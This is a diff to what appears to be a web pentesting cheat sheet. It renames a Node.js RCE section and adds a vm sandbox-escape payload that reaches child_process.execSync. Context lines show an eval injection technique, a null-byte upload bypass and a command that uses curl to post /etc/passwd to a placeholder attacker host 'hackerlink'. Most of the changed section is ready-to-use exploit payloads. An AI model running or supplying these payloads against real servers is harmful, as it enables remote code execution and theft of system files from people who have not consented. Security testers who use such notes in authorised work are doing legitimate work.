@@ -16,7 +16,7 @@
    - [XSS](#xss)
    - [Arbitrary File Upload](#AFU)
    - [Symfony](#symfony)
-   - [Nodejs RCE](#nodejsrce)
+   - [Javascript RCE](#jsrce)
    - [XML External Entity (XXE)](#xxe)
    - [Subdomain Takeover](#subdomain)
    - [Path Traversal Vulnerability](#ptv)
@@ -250,8 +250,10 @@ Beacon.html%00.pdf (or other extension which is allowed by the service e.g. .jpg
 ### Symfony
 If the web app uses a php tools called symfony, you can try to access /_profile to access the log.
 
-<a name="nodejsrce"></a>
-### Nodejs RCE
+<a name="jsrce"></a>
+### Javascript RCE
+
+#### Exploit eval function
 In Nodejs module, there is a function called eval. If you suspect that eval is used in backend service, it can be exploited using RCE payload. For example, if a get request return a JSON parameter without "", it is highly likely that the backend was using eval to calculate that parameter. To check, you can put below in your request, it should return current directory (e.g. /app) in its respsonse.
 
 ```
@@ -271,6 +273,13 @@ Also, you can also use child_process.exec to execute some linux command at backe
 
 ```
 require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://hackerlink');
+```
+
+#### Exploit vm
+If the application backend uses vm as sandboxing, RCE can be run on below payload:
+
+```
+const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('ls').toString()
 ```
 
 <a name = "xxe"></a>
